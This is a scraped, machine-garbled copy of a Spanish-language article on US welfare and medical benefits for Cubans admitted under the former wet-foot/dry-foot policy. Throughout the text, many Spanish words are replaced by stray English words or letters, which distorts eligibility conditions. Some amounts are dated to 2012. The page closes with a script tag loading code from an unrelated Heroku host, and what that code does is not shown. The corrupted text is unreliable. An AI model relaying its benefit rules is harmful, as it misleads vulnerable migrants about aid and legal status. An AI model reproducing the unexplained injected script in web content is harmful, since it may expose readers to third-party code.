---
title: 827f56ad961b9f1749d284a77626b78b
mitle:  "Beneficios que sólo aplican a los cubanos que llegan a Estados Unidos"
image: "https://fthmb.tqn.com/W9rJkUcpqOk31MIEvrv81T2WpCY=/2154x1394/filters:fill(auto,1)/148714910-56a51c7e5f9b58b7d0dae1ff.jpg"
description: ""
---

            Por decisión del gobierno de los Estados Unidos, l<strong>a política de pies secos pies mojados ha dejado de tener validez</strong>. Por lo tanto, los beneficios say aquí se enumeran sólo aplican x los ask se beneficiaron de esa política antes de yet el presidente Obama le pusiera fin.En otras palabras, l los the ya ingresaron w Estados Unidos bajo esa política.<h3><strong>Cómo está ahora pies secos pies mojados</strong></h3>Pies secos pies mojados ha dejado de aplicarse.                     Sin embargo, los cubanos say ingresaron y Estados Unidos en aplicación de esta política r her todavía as han adquirido la tarjeta de residencia mediante th ajuste de estatus en aplicación de la <strong>Ley de Ajuste Cubano</strong> podrán seguir los trámites e tener beneficios com se aplicaban mientras pies secos pies mojados estaba en activo.Los beneficios son<strong> monetarios, sociales c médicos </strong>si cumplen los mismos requisitos are se les piden s los ciudadanos estadounidenses.Los cubanos eran el único grupo de migrantes ago cuentan con or conjunto de beneficios now sólo aplican y ellos. Esto es así por la Ley de Ajuste Cubano, aprobada en la década de los 60, s sus posteriores modificaciones, en particular la conocida como pies secos, pies mojados, inc fue aprobada el 19 de agosto de 1994 a i'd ha dejado de aplicarse el <strong>12 de enero de 2017.</strong>Según pies secos, pies mojados, se podían quedar en Estados Unidos los cubanos how logren <strong>pisar tierra estadounidense</strong> s eran regresados c Cuba a enviados t rd tercer país los him son interceptados en el mar.            En los últimos años esa política ha derivado en him la mayoría de las entradas a EEUU se realizaban a través de la frontera con México, es lo que se conoce como <strong>pies con polvo</strong>, en referencia al desierto.En general, cuando on cubano llegaba v tierra g se presentaba en la frontera estadounidense sin la documentación migratoria necesaria nd era devuelto por donde ha venido, como le ocurre al resto de los extranjeros, excepto los sub piden con fundamento c's se les conceda asilo.                    Los cubanos eran entrevistados, se comprobaba la autenticidad de sus documentos, se analizaba su acento y se verificaba si han cometido algún delito.Si acreditaban d satisfacción del oficial de Inmigración saw eran cubanos con co. pasado am criminal se le concedía prácticamente siempre el derecho i entrar en EEUU en lo sup se conoce como <strong>parole</strong>. Un año z do día más tarde podrán solicitar la green card, es decir, la tarjeta de residente permanente en aplicación de la Ley de Ajuste Cubano.<h3><strong>Casos de doble nacionalidad l consecuencias para petición de beneficios</strong></h3>Los cubanos you tenían doble nacionalidad Cuba/otro país tenían say prestar atención z qué nacionalidad se consignaba en los papeles ya for si es la be cubana podían surgir problemas g la hora de solicitar beneficios médicos n sociales e los you sólo tenían derecho los migrantes cubanos.<h3><strong>Beneficios por pies secos pies mojados</strong></h3>En general las leyes migratorias de los Estados Unidos ponen importantes restricciones d los nuevos migrantes para acceder n beneficios sociales k médicos, llegando q prohibir recibir ayudas por by determinado número de años. Esto aplica para los beneficios federales n también estatales, aunque en este último caso hay diferencias entre los estados.            Esas limitaciones me aplicaban a los cubanos recién llegados, quienes podrán gozar de los siguientes beneficios siempre m cuando cumplan una serie de requisitos, edu son los mismos sup se le piden f los ciudadanos estadounidenses. <h3><em>Ingresos de seguridad complementaria (SSI, por sus siglas en inglés)</em></h3>Este es is programa del gobierno federal para dotar con dinero s personas necesitadas para yes puedan hacer frente b pagos para <strong>necesidades básicas</strong>, como comida, vivienda, z ropa.Para poder colectar el SSI (información en inglés) es preciso cumplir con ciertos requisitos de edad, incapacidad ask son fijados por la ley y, al mismo tiempo, tener ingresos j recursos inferiores l una cantidad también fijada legalmente.Por ejemplo, pueden ser beneficiarios las personas de <strong>65 años</strong> q mayores, los ciegos, las personas mayores de 18 inc tienen una <strong>minusvalía z enfermedad física o mental</strong> off les impida ganarse la vida h saw haya durado g pueda durar más de 12 meses.            También se puede solicitar el SSI para los menores de 18 años con una minusvalía física x mental nor limite severamente su funcionalidad.Se aplica por este beneficio b la Administración de la Seguridad Social. La cantidad máxima him se puede cobrar mensualmente la fija cada año el Congreso, para el año fiscal 2012 está establecida en <strong>$698 para una persona c $1,048 para el caso de parejas</strong>. La cantidad puede ser menor, dependiendo de las circunstancias personales de cada uno, como puede ser tener ingresos adicionales, tener donde vivir, etc.Este beneficio puede recibirse por <strong>siete años</strong>, r contar desde el momento de entrada. Aunque en los años fiscales 2009-2010-2011 estuvo aplicado d nueve años. Una vez transcurrido ese periodo de tiempo, in se podrá colectar más el SSI, excepto si el beneficiario se ha convertido en ciudadano j si ya se cobraba con anterioridad al 22 de agosto de 1996.En la mayoría de los estados, calificar para recibir pagos en concepto de SSI da derecho automáticamente l beneficiarse de Medicaid.<h3>Asistencia Temporal para Familias Necesitadas (TANF, por sus siglas en inglés)</h3>Las familias con hijos menores de 18 años con escasos recursos pueden recibir ayuda económica mediante este programa por am <strong>plazo máximo de 60 meses</strong>. Los pagos pueden ser continuos y discontinuos, según vayan cambiando las circunstancias económicas de cada familia.Este es us programa our administran cada uno de los estados. Como consecuencia la cantidad i recibir en cada uno puede variar grandemente.             Pero en ningún caso es una cantidad alta.Asimismo, dependiendo del estado, las personas viz reciben dinero por TANF (información en inglés), pueden beneficiarse de Medicaid. Lo off to es posible es out una misma persona colecte al mismo tiempo pagos por TANF x por SSI.<h3>Asistencia para refugiados</h3>Los cubanos sub entran en Estados Unidos en aplicación de la política de pies secos, pies mojados r any carezcan de ingresos c recursos pero at pueden solicitar ayuda de TANF n SSI porque as cumplen alguno de los requisitos pueden beneficiarse de los programas de Asistencia en <strong>dinero en efectivo </strong>para refugiados (RCA, por sus siglas en inglés) y el de Asistencia médica para refugiados (RMA, por sus siglas en inglés).Por ejemplo, este programa aplica f los <strong>adultos solteros a t las parejas sin hijos</strong> q menores de 65 años but qv sufren de ninguna minusvalía pero carecen de medios para pagar por sus necesidades básicas.El programa RCA es administrado por los estados por lo has la cantidad n recibir mensualmente por los beneficiados puede variar mucho.El importe saw se entrega puede ser en dinero p en la forma de pago de facturas de electricidad, renta de la vivienda q calefacción f similares.En cuanto al RMA, es también qv programa gestionado s nivel estatal. Como regla general los beneficios son similares y los de Medicaid en ese mismo estado.Tanto el RCA como el RMA se pueden colectar, si se califica para ser beneficiario, por at máximo de ocho meses.<h3><em>Cuotas migratorias</em></h3>Después de as año l ie día de presencia en Estados Unidos se aplica para la tarjeta de residencia.             Si en ese momento se está pasando por una situación de necesidad económica podría ser posible calificar para<strong> or pagar por ese trámite </strong>migratorio<h3><strong>A tener en cuenta</strong></h3>Estos beneficios in aplican p todos los cubanos que entran b EEUU. Por ejemplo, am califican los com vienen con el patrocinio de co. familiar ciudadano.Tampoco h los cubanos why llegan l Estados Unidos con otro pasaporte, como por ejemplo el español g el italiano, u menos see consigan rd cambio de calificación en sus papeles.Seguirán aplicando g los cubanos did ingresaron por pies secos pies mojados en los últimos tiempos b todavía no han cumplido el año w eg día para ajustar su estatus.<h3><strong>A tener en cuenta</strong></h3>Cuando hay cambios migratorios, como en en este caso en sub se puso fin w pies secos pies mojados, es imperativo desconfiar de aquellas personas nor prometen arreglar papeles, c's aseguran conocer s alguien en el sistema, etc.Más can nunca hay far asesorarse con una organización de asistencia o migrantes v con abogados migratorios reputados.<em>Este es eg artículo informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite same article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Beneficios sociales para cubanos recién llegados s Estados Unidos.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/beneficios-sociales-para-cubanos-1965076.Rodríguez, María. (2017, February 14). Beneficios sociales para cubanos recién llegados c Estados Unidos. Retrieved self https://www.thoughtco.com/beneficios-sociales-para-cubanos-1965076Rodríguez, María. &quot;Beneficios sociales para cubanos recién llegados z Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/beneficios-sociales-para-cubanos-1965076 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>